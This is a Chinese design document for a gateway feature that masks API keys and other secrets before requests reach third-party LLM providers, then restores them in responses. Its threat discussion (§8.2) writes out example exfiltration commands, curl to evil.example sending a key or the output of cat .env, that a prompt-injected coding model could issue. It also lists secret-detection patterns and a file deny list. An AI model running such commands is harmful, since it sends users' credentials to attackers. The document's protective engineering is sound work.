# 密钥不出本机：发往第三方供应商前的密钥脱敏（设计稿）

> 状态：P1–P3 已实现（2.0.2，`feat/v2.0.2`）；请求对照决定不做（§12）。范围只含**第三方供应商**（经统一网关的流量）；官方账号登录的会话直连官方、不经网关，不在本稿范围。
>
> 相关代码：`packages/gateway/src/server.ts`（入口、候选循环与响应写出）、`src/upstream.ts`（`upstreamBody`）、`src/trace.ts`（现有 `redactText` / `redactJson`）、`packages/electron/src/memory/episodes.ts`（`SECRET` 正则）、`packages/electron/src/desktop/pathGuard.ts`（文件拒绝名单）、`packages/electron/src/gateway/GatewayService.ts` / `GatewayStore.ts`（配置快照与选项）。
>
> 参考：[magpie](https://github.com/yetone/magpie)（MIT）的隐私脱敏（`internal/redact`、`internal/masking`、`internal/gwmw`、`LESSONS.md`）。占位符、回程还原、已见值匹配、跳过规则、出错不发都借鉴自它；移植它的规则或测试用例时在 `CREDITS.md` 登记。

> 界面名称：**外发保护**（设置 → 隐私与权限 →「外发保护」标签，英文 Outbound protection）。它管的是数据发给模型 / 第三方供应商时的流向处理，和「隐私与数据」（数据存在本机）分成两个标签；代码与本稿里沿用「隐私模式」（`privacyMode`、`privacy/`）。

## 0. 一句话

模型不需要知道密钥的值，只需要能指代它。网关在请求发往云端第三方供应商之前，把请求体里的密钥换成稳定的占位符 `{{API_KEY_k3v9x2mq}}`；回复流回客户端时再把占位符换回原值。编程助手和用户看到的始终是真值，供应商一个也看不到。

## 1. 现状与问题（代码事实）

| 通道                       | 例子                                                    | 现状                                                                               |
| -------------------------- | ------------------------------------------------------- | ---------------------------------------------------------------------------------- |
| 用户贴进对话               | 「这个 key 为什么 401：sk-…」                           | 原样发出                                                                           |
| 编程助手的工具结果         | Claude Code / Codex 读 `.env`、跑 `env`、`cat ~/.npmrc` | 工具在 CLI 进程里执行，Nomi 看不到；结果随下一轮请求原样发出                       |
| Nomi 桌面工具              | 读文件                                                  | `pathGuard` 有 `DENY_NAMES`（`.env*`、`*.pem`、`.npmrc` 等），只管 Nomi 自己的工具 |
| 记忆、知识库、屏幕记忆召回 | 召回的文本拼进提示词                                    | `episodes.ts` 写入情节记忆时命中 `SECRET` 就**整条丢弃**，其余通道不管             |
| 调试追踪                   | `trace.ts`                                              | 写盘前按已知 Key 原文、常见格式、敏感字段名脱敏，**只作用于追踪文件**              |

问题：

- 检测规则有三份（`trace.ts`、`episodes.ts`、`ai-runtime/observability/redaction.ts`），口径不一致；
- 发往上游的请求体本身没有任何脱敏；
- 编程助手的工具 Nomi 控制不了。所有第三方流量唯一都会经过的地方就是网关。

## 2. 目标与非目标

### 2.1 目标

- G1 发往**云端**第三方供应商的请求体里，不出现可识别的密钥原文。
- G1.1 **对所有客户端一视同仁**：Nomi 对话、全部内置编程助手（claude / codex / grok / gemini / dsh）以及通过 `registerClientSpec` 登记的插件客户端，都受同一个隐私模式开关控制，不提供按客户端的例外。
- G2 **什么都不坏**：
  - 占位符确定：同一个值在同一台机器上总是同一个占位符，提示缓存、缓存亲和（§11.2）、thinking 签名都不受影响；
  - 回程还原：回复（流式文本、工具调用参数）里的占位符换回原值，编程助手执行的命令、写出的文件里是真值；
  - 不破坏协议：签名过的推理、加密推理、各种 id、图片 / 文件的 base64、工具定义的结构一律不动。
- G3 同协议透传、跨协议转换都覆盖，四种入口协议共用一套逻辑。
- G4 **出错不发**：隐私模式开着、脱敏却出错时，请求被拦下，绝不按原样发出。
- G5 可见、可控：用户知道遮了什么（只看类型、长度、开头几个字符，不看值），能关、能按类型选动作、能加例外、能登记自定义密钥。
- G6 检测规则只有一份，网关、追踪、情节记忆共用。

### 2.2 非目标（本阶段不做）

- 官方账号会话（不经网关）。
- 个人信息（邮箱、手机号、证件号、人名地址）与本地识别模型。magpie 两者都有（本地模型是 1.6 GB 的 OpenAI Privacy Filter）；本稿只管密钥，以后按需要再加。
- 图片、截图、PDF 里的密钥（OCR 打码不可靠，靠源头排除）。
- 编码、拆分、变形过的密钥（base64 后的 key、分两条消息发、逐字拼写）。
- 本机 / 局域网上游（Ollama、LM Studio、llama.cpp）：数据不出本机，默认不脱敏。

## 3. 设计原则

1. **去程只做一次，回程只在写出处做**：入口请求体解析之后、候选循环之前算一次脱敏结果；回程在写给客户端的最后一层还原。不分散到各协议的编解码器里。
2. **只改值不改结构**：只替换字符串叶子里命中的片段，不增删字段，不改数组长度。
3. **宁漏勿误**：默认只开零误报和极低误报的规则（已知原文、已见值、固定前缀）；靠上下文和熵判断的规则默认关。遮坏一个 id 或一段语法，上游每轮都 400，比漏掉一个少见格式更伤。
4. **原值只在网关进程内存里**：不落盘、不进日志、不出进程。命中记录只带类型、长度、开头几个字符和占位符。

## 4. 架构

```
 CLI / Nomi 对话 ──POST──▶ 网关 ingress：鉴权 → readBody → trace.request
                                │
                                ▼
                     privacy.mask(wire, body)          ← 每请求一次；抛错 → 500，不发（§10）
                     → { masked, hits[], blocked }      （未命中时 masked === body，零拷贝）
                                │
                     blocked？→ 返回入口协议格式的错误，不发（§9）
                                │
                     候选循环：cand.local ? body : masked
                                │
                     upstreamBody（同协议改写 / 跨协议转换 / 修正）→ fetch
                                │
                     响应：透传事件 / 转换后事件 ──▶ privacy.Restorer ──▶ 客户端   ← 回程还原（§8）
                                │
                     用量事件带上 hits 摘要 ──MessagePort──▶ 主进程（审计、界面提示）
```

- 新建 `packages/gateway/src/privacy/`（纯 Node）：
  - `rules.ts`：检测规则（§5），从 `trace.ts` 的 `SECRET_PATTERNS` 迁过来扩充；
  - `known.ts`：已知原文与已见值的多模式匹配（§5.2）；
  - `table.ts`：占位符 → 原值的内存表（§7.2）；
  - `mask.ts`：`maskBody(wire, body, ctx) → { body, hits, blocked }`，按 §6 的跳过规则遍历 JSON；
  - `restore.ts`：`Restorer`，按 SSE 事件或整个响应体还原占位符，处理被切开的占位符（§8）；
  - `placeholder.ts`：占位符生成（§7）。
- `trace.ts` 的 `redactText` 改为调用 `privacy/rules`（追踪仍用 `[REDACTED]` 整体抹掉，不用占位符）。追踪记下的「发给上游的请求体」是脱敏后的。
- `episodes.ts` 的 `SECRET` 改为从网关包导入同一套规则（electron 可以 import 网关包，反之不行）。
- 去程挂载点：`server.ts` 的 `proxy()` 里，`trace?.request(...)` 之后、解析候选之前。`countTokens` 也用同一份结果，保证本地估算和实际发出的一致。
- 回程挂载点：响应写给客户端的最后一层（同协议的逐事件透传和跨协议的编码输出都经过它），在 SSE 事件或非流式响应体上做，不碰 NormEvent。
- **云端判断**：复用 §12.5 的口径（上游地址不在本机 / 局域网即云端）。按候选当前协议的上游地址判断（`privacy/index.ts` 的 `isLocalCandidate`），不改 `Candidate` 结构。本机候选发原文，回复里也就没有占位符可还原。

## 5. 检测规则

### 5.1 规则分级

每条规则带 `kind`（大写下划线，进占位符与界面：`API_KEY`、`PRIVATE_KEY`、`TOKEN`、`PASSWORD`、`CONNECTION_STRING`、`CUSTOM`）。

| 级别           | 规则                                                                                                                                                                                                                                                                                                                                                                       | 例子                | 默认                   |
| -------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------- | ---------------------- |
| L1 已知原文    | 配置快照里的所有第三方 Key、客户端令牌；主进程登记的其他密钥（语音识别 Key 等）；用户在设置里登记的自定义密钥                                                                                                                                                                                                                                                              | —                   | 开（不可关）           |
| L1′ 已见值     | 本进程里遮过的每一个值（§5.2）                                                                                                                                                                                                                                                                                                                                             | —                   | 开（不可关）           |
| L2 固定前缀    | `sk-ant-…`、`sk-proj-…`、`sk-or-…`、`sk-…`、`<2–4 字母>_sk_…`（中转站自己的 key）、`gh[pousr]_` / `github_pat_`、`glpat-`、`xox[abpr]-`、`AKIA` / `ASIA` + 16 位、`AIza…`、`hf_`、`xai-`、`gsk_`、`nomi-gw-` / `nomi-tab-`、`-----BEGIN … PRIVATE KEY-----` 整块、JWT（`eyJ` 三段）、`Bearer <token>`、连接串与 URL 里的 `user:pass@`、查询串里的 `key=` / `access_token=` | `sk-ant-api03-…`    | 开                     |
| L3 上下文 + 熵 | `.env` / YAML / JSON 里键名像密钥（`*_KEY`、`*_TOKEN`、`*_SECRET`、`password`）的值，且值的香农熵 ≥ 阈值、长度 ≥ 12                                                                                                                                                                                                                                                        | `DB_PASSWORD=Xk29…` | 关（设置里「严格」档） |

细则：

- 每条规则带**快速标记**（如 `sk-`、`PRIVATE KEY`）：文本里不含任何标记就不跑正则，长文本只扫一遍标记。
- 每条规则带**边界字符**：前后紧挨字母数字、`_`、`-` 的不算（`task-…`、`desk-…`、长单词中间的片段）。
- 每条规则写**正例和反例测试**，反例要包括 id、UUID、git sha、lockfile integrity、base64 图片。
- 规则表带版本号 `RULES_VERSION`，命中记录里带上，便于排查误报。

### 5.2 已见值：遮过一次，之后在哪里都遮

规则靠上下文找值（`DB_PASSWORD=` 后面、`sk-` 开头）。但回程还原之后，值会出现在规则认不出的地方：

1. 模型回复「密码是 `{{PASSWORD_ab12cd34}}`，写进 config 就行」；
2. 网关还原，CLI 看到的是真密码；
3. 下一轮这段话作为历史发回来，前后没有 `password=`，规则匹配不到，原文就漏出去了。

所以每个被遮过的值都加进「已见值」集合，之后任何请求、任何位置只要出现这个原文，就按同一个占位符遮。

- 最短 8 个字符才进已见值（短值在普通文本里到处都是）；
- 和 L1 共用匹配器：按值的前 8 字节建索引，配合前 4 字节的位图，绝大多数位置不用查表；
- 已见值跨会话、跨客户端共享（同一个值在哪个会话里占位符都一样），跟 §7.2 的内存表同生命周期。

### 5.3 不遮的值

- **id**：UUID、32 位以上的十六进制串，以及键名是 `id` / `ids` / `*_id` / `*_ids` / `*Id` 的字段里的值，整个和片段都不遮。供应商要拿 id 去匹配（工具结果的 `tool_call_id` 对应调用的 `id`），后端要按 id 查数据，一边遮了另一边没遮就对不上。例外：键名明确是凭据的（`password`、`api_key`、`refresh_token`）照遮，但键名是 id、游标、摘要的（`secret_id`、`next_page_token`、`secret_hash`、`Idempotency-Key`）不遮。
- **例外名单**：用户标为「从不脱敏」的值，任何规则找到都原样发出。最多 200 条、每条最长 256 字符；主进程只保存 HMAC 标记（§7.1），网关按标记比对，例外名单本身也不存原文。

## 6. 遍历与跳过规则

`maskBody` 深度优先遍历请求体，只处理字符串叶子，按**路径**判断，不只看字段名。

| 位置                                                                                                                                                                                         | 处理                             | 原因                                                                 |
| -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------- | -------------------------------------------------------------------- |
| 协议字段：`model`、`type`、`role`、`name`、`namespace`、`server_label`、`server_name`、`status`、`stop_reason`、`finish_reason`、`media_type` / `mime_type`、`prompt_cache_key`、`effort` 等 | 不遮                             | 供应商按结构读；Codex 校验 `namespace` 只能是 `[a-zA-Z0-9_-]+`       |
| id 类字段（§5.3）                                                                                                                                                                            | 不遮                             | 要能对上                                                             |
| `type: "thinking"` / `"redacted_thinking"` 块里的 `signature`、Responses `reasoning` 的 `encrypted_content`、Gemini `thoughtSignature`                                                       | 不遮                             | 签名 / 加密内容，改了上游 400                                        |
| 以 `data:` 开头的字符串、`image` / `document` 的 base64 `source.data`、Gemini `inlineData`                                                                                                   | 不遮                             | 媒体                                                                 |
| **工具调用参数**：Messages `tool_use.input` 整棵、Chat `tool_calls[].function.arguments`、Responses `function_call.arguments` / `custom_tool_call.input`                                     | **照遮，里面的键名一律不豁免**   | 参数是模型写的，里面的 `signature`、`name`、`user_id` 装的是用户数据 |
| **工具定义与结构化输出**：`tools[]`、各种 `input_schema` / `parameters` / `response_format` / `text.format`、Lark 等语法定义                                                                 | **只遮 `description`**，其余不动 | 供应商把它当结构读，遮了语法里的规则名就是 400                       |
| 其余（消息正文、工具结果、system）                                                                                                                                                           | 照遮                             |                                                                      |

说明：

- magpie 踩过的坑（`LESSONS.md`）：按字段名豁免「带 `signature` 的对象」和所有 `*_id`，导致工具参数里的 `{"signature": …, "body": "DB_PASSWORD=…"}` 原样发出。本稿的豁免**只看路径**：签名只在推理块里豁免，工具参数下面什么都不豁免。测试要把受保护的键名放到用户数据的位置上（工具参数、消息正文、嵌套对象）去验证。
- 推理块的正文不遮也不需要遮：模型只见过占位符，它的推理里只会有占位符；功能刚开启时历史推理里残留的原文，接受不处理（遮了签名对不上）。
- `arguments` 是 JSON 字符串：按字符串整体扫描。占位符只含 `{ } A-Z a-z 0-9 _`，不需要转义，替换后仍是合法 JSON。
- 未命中时返回原对象（结构共享），命中时只复制命中路径上的节点。
- 性能预算：1 MiB 文本类请求体扫描 ≤ 5 ms（M 系列 CPU）；长度 < 8 的字符串直接跳过。实现上：所有快速标记合成一个正则扫一遍拿到位置，各规则只在标记前 64、后 512 个字符的窗口里匹配（私钥块后 16 KiB、JWT 后 8 KiB），窗口加起来超过半段才整段扫；已知值不超过 64 个前缀时用原生 `indexOf`。实测约 3.4 ms（严格档约 5 ms）。

## 7. 占位符

### 7.1 格式

`{{<KIND>_<tag>}}`，例如 `{{API_KEY_k3v9x2mq}}`。

- `KIND`：规则给的类型名（§5.1），告诉模型这是什么。
- `tag`：`HMAC-SHA256(installKey, KIND + "\0" + 原文)`，base32 编码后取 8 个字符、转小写。
  - `installKey`：主进程首次启动时生成 32 字节随机数，`safeStorage` 加密存储，随配置快照下发给网关。用 HMAC 而不是裸哈希，是为了让短密码没法从 tag 暴力反推。
  - 同一台机器上确定（满足 G2）；重置或换机器后 tag 变化，只影响一次缓存。
  - 一个占位符只对应一个值：40 位 tag 在单机的值数量下碰撞可以忽略；万一碰上（内存表里已有同名占位符但原值不同），第二个值改发成 `{{KIND_<tag>_2}}`。
- 不暴露末几位、不暴露长度给模型。本机界面里显示类型、长度、开头几个字符（来自命中记录）。
- 不改 system 提示词去解释占位符：CLI 的 system 改了会破坏缓存前缀、干扰 CLI 自己的提示词。`{{…}}` 形式模型普遍能理解，实测不行再在 Nomi 对话自己的系统提示词里加一句。

### 7.2 内存表

- 网关进程内存里维护「原值 ↔ 占位符」表（`privacy/store.ts`），生成占位符时登记，同时登记进已见值（§5.2）。
- **回程只按本请求的映射还原**：`maskBody` 返回这个请求遮掉的「占位符 → 原值」，回程只换这些（模型只见过这些占位符）；全局表只用来保证同一个值总是同一个占位符、以及已见值匹配。
- **不落盘**。上限 20 万条，满了丢掉最旧的一半。
- 重启或被淘汰都不丢功能：客户端每一轮都会把完整历史（含原文）重新发来，下一个请求就把值带回来了。
- 配置快照更新不清空这张表；只有关闭隐私模式、重置 `installKey` 时清空。

## 8. 回程还原（默认开）

### 8.1 做法

回复写给客户端之前，把里面的占位符换回原值，**正文和工具调用参数都换**：

- 流式：逐个 SSE 事件处理。事件 `data` 是 JSON，只在字符串值里找占位符，换成原值时按 JSON 转义（私钥带换行）。
- 被切开的占位符：`{{API_` 在一个增量里、`KEY_k3v9x2mq}}` 在下一个里。某个事件的文本以「可能是占位符开头」的片段结尾时，扣住这个事件；下一个事件是同一段文本（同一个内容块 / 同一个工具调用的参数）的增量时，把扣住的尾巴挪过去拼完整再还原；不是的话，原样放出扣住的事件。不增不减字符，客户端拼出来的文本和不切开时一样。
- 非流式：整个响应体收完后还原一次。
- 本请求映射里没有的占位符（模型编出来的、复述的旧占位符而这一轮历史里已经没有对应原值）原样留着。
- 记下每个占位符还原了几处，进命中记录。

### 8.2 为什么默认开

不还原的话，「把这个 key 写进 `.env`」「用这个 token 调一下接口」这类任务都会写进或发出占位符，编程助手基本不可用。

外泄风险的判断：被提示注入的模型可以写出 `curl https://evil.example/?k={{API_KEY_…}}`，还原后真值就出去了。但编程助手本来就能自己读 `.env`，注入的模型直接写 `curl https://evil.example/?k=$(cat .env)` 效果一样，根本用不到还原。所以还原带来的额外风险很小，防外泄要靠编程助手自己的权限模式（`docs/design/cli-permission-modes.md`），不靠网关。magpie 也是默认全部还原。

## 9. 找到之后怎么处理：按类型选动作

每种 `KIND` 可以选三种动作之一，对所有客户端生效（G1.1）：

| 动作         | 行为                                                          |
| ------------ | ------------------------------------------------------------- |
| 脱敏（默认） | 换成占位符发出，回程还原                                      |
| 只提醒       | 原样发出，但记一条命中（界面上能看到「发出了 1 个 API_KEY」） |
| 拦截         | 这个请求不发，返回入口协议格式的错误（§9.1）                  |

- 动作按类型设，不按客户端设；不能对某一个编程助手单独放行。
- 例外名单（§5.3）优先于动作：例外里的值不算命中。

### 9.1 拦截的错误

- HTTP 400，按入口协议的错误格式（`errors.ts` 的 `errorResponse`）。不用 403：网关对 CLI 的约定是 401 / 403 会被当成要重新登录（§6.11.5）；
- 消息：「请求里有设为拦截的密钥（PRIVATE_KEY ×1），已按隐私设置拦下。可以在 设置 → 隐私与权限 里改成脱敏。」
- 不重试、不换候选、不计冷却；用量事件记 `blocked: true`。

## 10. 出错不发

- 隐私模式开着时，`maskBody` 抛错（规则 bug、内存表异常）→ 返回入口协议格式的 500，消息「脱敏出错，请求没有发出」，**绝不退回发原文**。不用 503：503 映射成 overloaded，编程助手会自动重试同一个必然失败的请求。
- 回程 `Restorer` 抛错 → 这一个响应按原样（带占位符）写出并记错误。回程出错不泄露任何东西，只是客户端看到占位符。
- 隐私模式关着时不进 `maskBody`，零开销。

## 11. 配置与数据流

`GatewayConfig` 新增：

```ts
privacy?: {
  /** 隐私模式：true（默认）= 脱敏 + 回程还原；false = 不扫，原样发出 */
  enabled: boolean;
  /** 是否启用 L3（严格档） */
  strict?: boolean;
  /** 本机 / 局域网上游也脱敏（默认 false） */
  local?: boolean;
  /** 占位符 HMAC 密钥（主进程生成，safeStorage 存储） */
  key: string;
  /** L1 额外已知原文：主进程里其他服务的密钥 + 用户登记的自定义密钥（只在网关内存里） */
  known?: Array<{ kind: string; value: string }>;
  /** 按类型的动作；没列出的类型是 mask */
  actions?: Record<string, 'warn' | 'block'>;
  /** 例外名单的 HMAC 标记 */
  allow?: string[];
};
```

- 第三方 Key 与客户端令牌已经在快照里，网关自己收集，不需要主进程重复下发。
- **隐私模式开关的存储**：和 `strictParams` 一样存在 `GatewayStore` 的 `store.json` 里，字段 `privacyMode?: boolean`，**没有这个字段 = 开**（老用户升级后自动开启，不需要迁移）；只有用户手动关掉才写入 `false`。生成快照时转成 `privacy.enabled`。读写沿用 `ai:gateway:set-options`（`setOptions` 的 patch 增加 `privacyMode`），状态从 `ai:gateway:state` 带回。切换后推送新快照，进行中的请求继续用旧快照（§5.3），下一个请求起生效。
- **作用范围是全部客户端**：脱敏挂在网关入口、按请求做，不看是哪个客户端（G1.1）；唯一的区分维度是上游在不在本机（`isLocalCandidate`）。
- 用量事件新增：

  ```ts
  redactions?: Array<{
    kind: string;
    placeholder: string;
    action: 'mask' | 'warn' | 'block';
    /** 原值长度与开头几个字符（≤ 4 个，且不超过长度的 1/4），给界面辨认用 */
    len: number;
    head: string;
    /** 去程遮了几处 / 回程还原了几处 */
    masked: number;
    restored: number;
  }>;
  blocked?: boolean;
  ```

  每条命中还带 `allowTag`（`allowTagOf(key, 原文)`，HMAC，反推不出原文），界面点「这不是密钥」时主进程直接存它。

  主进程（P2 实现）：
  - **最近隐藏的密钥**（`packages/electron/src/gateway/PrivacyLog.ts`）：按占位符汇总（同一个值每一轮随历史再遮一次，按请求记会刷屏），记类型、长度、开头几个字符、例外标记、出现在几个请求、哪些客户端、遮了 / 还原了几处；最多 200 个值，`userData/gateway/privacy-log.json`（0600，攒 2 秒写一次，退出时写盘）。这份记录同时充当审计；原先设想的「请求列表」已不存在（网关事件只进模型质量账本），桌面工具的 `AuditLog` 格式也不适用，所以单独做。
  - **Nomi 对话的提示**：网关在发了脱敏请求体的响应上带 `x-nomi-redacted: N`（这次请求里遮掉的不同值个数），ai-runtime 只认可信网关的这个头（`redactedHeader`，与 `servedModelHeader` 同样的做法），多步工具循环取各步最大值，写进用量的 `redacted`；对话摘要里显示「已隐藏 N 个密钥」，悬停说明包括历史消息里的、回复里已换回原值。编程助手的会话不显示（它们的消息来自 CLI 自己的会话记录）。
  - IPC：`ai:gateway:privacy-set-action`、`privacy-add-secret`、`privacy-remove-secret`、`privacy-add-allow`（给标记与辨认信息，或给原文由主进程算标记后丢弃）、`privacy-remove-allow`、`privacy-log`、`privacy-clear-log`。存储字段 `privacyActions` / `privacySecrets`（加密）/ `privacyAllow`（只有标记）。

## 13. 形状保持模式（P3 ✅，可选，默认关）

把 key 换成**同形状的假 key** 而不是占位符：`sk-proj-w3axCByTQgK1Px…` → `sk-proj-hYQWRBFmdHNI…`，前缀、长度、分隔符和每一位的字符类别都相同，回程同样还原。

- 好处：编程助手或工具对 key 格式的校验能通过，模型也不会对着占位符说「这里有个占位符」。
- 假 key 由同一个 `installKey` 派生（确定，缓存不受影响），登记进同一张内存表。
- 只用于 `API_KEY` / `TOKEN` 类、长度 ≥ 8 且其中可替换的随机字符 ≥ 6 个、只含字母数字和 `- _ .` 的值；其余照旧发占位符。
- 这就是「加密发出去、回来解密」的思路，但不用真加密：没有密文可解，供应商留存的日志将来也解不开，也不会多出几十个 token。

实现补充（`privacy/shape.ts`）：

- 保留的前缀按长的优先匹配（`sk-ant-api03-`、`sk-proj-`、`github_pat_`、`ghp_`、`xoxb-`、`AKIA`、`AIza`、`nomi-gw-`、`oc_sk_` 这类中转站前缀…），`- _ .` 原样，其余每一位按小写 / 大写 / 数字用 `HMAC(本机密钥, shape\0原文\0计数)` 的字节换掉。
- 假 key 撞上已经登记的别的值时退回占位符；切换这个模式时清空已见值（同一个值在两种模式下的表示不同）。
- 回程：假 key 没有花括号，按原样整串匹配；流式里结尾是某个假 key 的任意一段开头（哪怕一个字符）就扣住等下一个增量。只在正文 / 思考 / 工具参数这类增量字段上扣，`id`、`type` 这类每个事件都有的字段不扣——否则尾巴会被挪进下一个事件的 `id`。

## 14. 测试计划

- `privacy/rules`：每条 L2 规则的正例与反例；反例覆盖 id、UUID、git sha、integrity、base64 图片、长单词里的片段。
- `privacy/mask`：四种协议的 fixture（含 thinking + signature、reasoning + encrypted_content、图片、工具调用参数字符串、工具定义与 Lark 语法），断言：
  - 跳过位置原样不变、命中位置替换、未命中时对象引用相等；
  - 把 `signature`、`name`、`user_id` 放进工具参数，里面的密钥照样被遮；
  - 工具定义里只有 `description` 被遮。
- 已见值：第一轮按规则遮了 `DB_PASSWORD=…` 的值；第二轮同一个值出现在不带上下文的正文里，仍是同一个占位符。
- 确定性：同一请求扫两次结果全等；历史 + 新一轮的前缀部分与上一轮的脱敏结果逐字节一致（缓存前缀不变）。
- `privacy/restore`：占位符在一个增量里、跨两个增量、跨三个增量；扣住的尾巴后面跟的是另一个内容块；工具参数增量；私钥（带换行）还原后 JSON 合法；表里没有的占位符原样留着。
- 断言「值已消失」时先去掉占位符再查子串（magpie 的教训：随机 tag 碰巧拼出被查的子串）。
- 端到端（网关 Vitest）：mock 上游，断言收到的请求体不含已知 Key 原文、客户端收到的回复里是原值；同协议透传与跨协议转换各一条；本机上游不脱敏；隐私模式关闭时请求体原样发出（对象引用相等）；拦截返回各协议格式的 400 且上游没收到请求。
- 开关存储：`store.json` 没有 `privacyMode` 时快照里 `privacy.enabled === true`；`set-options` 写 `false` 后快照为关，再写 `true` 后恢复。
- 界面（ai-chat Vitest）：默认显示为开；点关弹确认，取消后仍为开；确认后调用 `set-options`；关闭时子项禁用。
- 性能：1 MiB / 8 MiB 请求体的扫描耗时，进 `tests/` 的基准断言（宽松阈值，防回退）。
- 回归：`trace.ts` 现有追踪测试和 `episodes` 测试在改用共享规则后仍通过。

## 16. 风险与待定问题

- **误报伤代码**：L2 的 `sk-` 前缀可能命中测试 fixture 里的假 key。因为回程会还原，误报的代价只是模型看到占位符、不能就这个值本身推理（「这个 token 为什么被拒」）；这类值加进「从不脱敏」。上线后看例外的使用量来调规则。
- **模型对占位符的理解**：需要实测 GLM、DeepSeek、Kimi、Qwen 等常用第三方模型会不会原样复述占位符、会不会改写它（改了大小写、去掉花括号就还原不了）。改写严重的模型可以优先用形状保持模式。
- **缓存**：功能首次开启（或规则版本升级新命中了历史里的内容）那一轮，缓存前缀变化，命中一次未缓存。可以接受，发版说明里写明。
- **大请求体性能**：长会话每轮都会重扫整段历史。如果 P1 实测超出预算，按字符串内容哈希做 LRU 缓存（只缓存「未命中」的结论，不缓存原文）。
- **内存**：内存表和已见值上限 20 万条；单条值很长（私钥几 KB）时按总字节数再设一个上限。
- **默认开对现有用户的影响**：升级后第一轮请求起就会脱敏，可能遇到一次缓存未命中，个别误报会让模型看到占位符。发版说明里写明，并告诉用户可以在 设置 → 隐私与权限 关闭。
